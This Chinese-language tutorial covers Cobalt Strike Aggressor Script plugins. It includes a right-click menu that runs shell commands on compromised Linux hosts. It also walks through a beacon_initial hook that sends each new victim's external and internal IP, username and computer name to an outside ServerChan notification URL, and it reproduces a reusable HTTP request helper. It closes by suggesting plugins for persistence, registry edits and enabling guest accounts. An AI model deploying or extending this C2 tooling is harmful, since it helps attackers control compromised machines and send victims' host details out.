# Aggressor Script — Popup Menus

## Popup Menus

适合liunx主机的右键菜单

```shell
popup ssh {
    item "执行命令" {
        prompt_text("你想运行哪一个命令?", "w", lambda({
            binput(@ids, "shell $1");
            bshell(@ids, $1);
        }, @ids => $1));
    }
}
```

![](/images/Aggressor-Script/image-20201216124754601.png)

使用方式和Beacon基本相同，所以不再赘述

## Server酱上线代码解析

> 代码来源：算命瞎子：<http://www.nmd5.com/?p=567>

源代码：

```shell
# 循环获取所有beacon
on beacon_initial {

    sub http_get {
        local('$output');
        $url = [new java.net.URL: $1];
        $stream = [$url openStream];
        $handle = [SleepUtils getIOHandle: $stream, $null];

        @content = readAll($handle);

        foreach $line (@content) {
            $output .= $line . "\r\n";
        }

        println($output);
    }
    #获取ip、计算机名、登录账号
    $externalIP = replace(beacon_info($1, "external"), " ", "_");
    $internalIP = replace(beacon_info($1, "internal"), " ", "_");
    $userName = replace(beacon_info($1, "user"), " ", "_");
    $computerName = replace(beacon_info($1, "computer"), " ", "_");

    #get一下Server酱的链接
    $url = 'https://sc.ftqq.com/此处填写你Server酱的SCKEY码.send?text=CobaltStrike%e4%b8%8a%e7%ba%bf%e6%8f%90%e9%86%92&desp=%e4%bb%96%e6%9d%a5%e4%ba%86%e3%80%81%e4%bb%96%e6%9d%a5%e4%ba%86%ef%bc%8c%e4%bb%96%e8%84%9a%e8%b8%8f%e7%a5%a5%e4%ba%91%e8%b5%b0%e6%9d%a5%e4%ba%86%e3%80%82%0D%0A%0D%0A%e5%a4%96%e7%bd%91ip:'.$externalIP.'%0D%0A%0D%0A%e5%86%85%e7%bd%91ip:'.$internalIP.'%0D%0A%0D%0A%e7%94%a8%e6%88%b7%e5%90%8d:'.$userName.'%0D%0A%0D%0A%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%90%8d:'.$computerName;

    http_get($url);

}

```

整体代码流程是，监听上线事件，当有新的主机上线的时候我们就执行代码：

```shell
#上线事件的监听

on beacon_initial {
    ...... # 代码
}

```

然后呢定义一个请求函数

```shell
    sub http_get {
        local('$output');
        $url = [new java.net.URL: $1]; # 实例化URL请求，$1为待输入的URl
        $stream = [$url openStream];
        $handle = [SleepUtils getIOHandle: $stream, $null];

        @content = readAll($handle);

        foreach $line (@content) {
            $output .= $line . "\r\n";
        }

        println($output);
    }
```

将刚上线的主机的 外网IP 内网IP 用户名 主机信息 提取出来，优化输出

```shell
    #获取ip、计算机名、登录账号
    $externalIP = replace(beacon_info($1, "external"), " ", "_");
    $internalIP = replace(beacon_info($1, "internal"), " ", "_");
    $userName = replace(beacon_info($1, "user"), " ", "_");
    $computerName = replace(beacon_info($1, "computer"), " ", "_");

```

最后格式化一下URL再请求

```shell
    $url = 'https://sc.ftqq.com/此处填写你Server酱的SCKEY码.send?text=CobaltStrike%e4%b8%8a%e7%ba%bf%e6%8f%90%e9%86%92&desp=%e4%bb%96%e6%9d%a5%e4%ba%86%e3%80%81%e4%bb%96%e6%9d%a5%e4%ba%86%ef%bc%8c%e4%bb%96%e8%84%9a%e8%b8%8f%e7%a5%a5%e4%ba%91%e8%b5%b0%e6%9d%a5%e4%ba%86%e3%80%82%0D%0A%0D%0A%e5%a4%96%e7%bd%91ip:'.$externalIP.'%0D%0A%0D%0A%e5%86%85%e7%bd%91ip:'.$internalIP.'%0D%0A%0D%0A%e7%94%a8%e6%88%b7%e5%90%8d:'.$userName.'%0D%0A%0D%0A%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%90%8d:'.$computerName;

    http_get($url);
```

这样就完成了一个 Server酱 上线提示的操作

这里我分享一个国外师傅打包好的请求方法：

```shell
# Safe & sound HTTP request implementation for Cobalt Strike 4.0 Aggressor Script.
# Works with HTTP & HTTPS, GET/POST/etc. + redirections.
# Author: Mariusz B. / mgeeky, '20
# <mb [at] binary-offensive.com>
import java.net.URLEncoder;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;


# httpRequest($method, $url, $body);
sub httpRequest {
    $method = $1;
    $url = $2;
    $body = $3;
    $n = 0;

    if(size(@_) == 4) { $n = $4; }

    $bodyLen = strlen($body);
    $maxRedirectsAllowed = 10;
    if ($n > $maxRedirectsAllowed) {
        warn("Exceeded maximum number of redirects: $method $url ");
        return "";
    }

    try
    {
        $urlobj = [new java.net.URL: $url];
        $con = $null;
        $con = [$urlobj openConnection];
        [$con setRequestMethod: $method];
        [$con setInstanceFollowRedirects: true];
        [$con setRequestProperty: "Accept", "*/*"];
        [$con setRequestProperty: "Cache-Control", "max-age=0"];
        [$con setRequestProperty: "Connection", "keep-alive"];
        [$con setRequestProperty: "User-Agent", $USER_AGENT];

        if($bodyLen > 0) {
            [$con setDoOutput: true];
            [$con setRequestProperty: "Content-Type", "application/x-www-form-urlencoded"];
        }

        $outstream = [$con getOutputStream];
        if($bodyLen > 0) {
            [$outstream write: [$body getBytes]];
        }

        $inputstream = [$con getInputStream];
        $handle = [SleepUtils getIOHandle: $inputstream, $outstream];
        $responseCode = [$con getResponseCode];

        if(($responseCode >= 301) && ($responseCode <= 304)) {
            $loc = [$con getHeaderField: "Location"];
            return httpRequest($method, $loc, $body, $n + 1);
        }

        @content = readAll($handle);
        $response = "";
        foreach $line (@content) {
            $response .= $line . "\r\n";
        }

        if((strlen($response) > 2) && (right($response, 2) eq "\r\n")) {
            $response = substr($response, 0, strlen($response) - 2);
        }

        return $response;
    }
    catch $message
    {
       warn("HTTP Request failed: $method $url : $message ");
       printAll(getStackTrace());
       return "";
    }
}
```

github链接：<https://github.com/mgeeky/cobalt-arsenal/blob/master/httprequest.cna>

## 后记

关于脚本编写的官方文档到这里就结束了，后面是自定义报告和一些其他零碎的东西，C2插件的编写最主要的是 数据模型 和事件，我们需要将不同的事件和数据模型结合，产生不同的结果；例如我们如何让上线的主机直接添加自启动、修改注册表、激活guest用户等，都可以自己写插件实现，由于 Aggressor Script是基于Sleep脚本语言来写的，所以需要好好的阅读Sleep官方的文档。翻译内容可能会存在错误，还请各位师傅斧正

## 参考文档

CS插件编写官方文档：<https://www.cobaltstrike.com/help-scripting>

Sleep语法文档：<http://sleep.dashnine.org/manual/index.html>
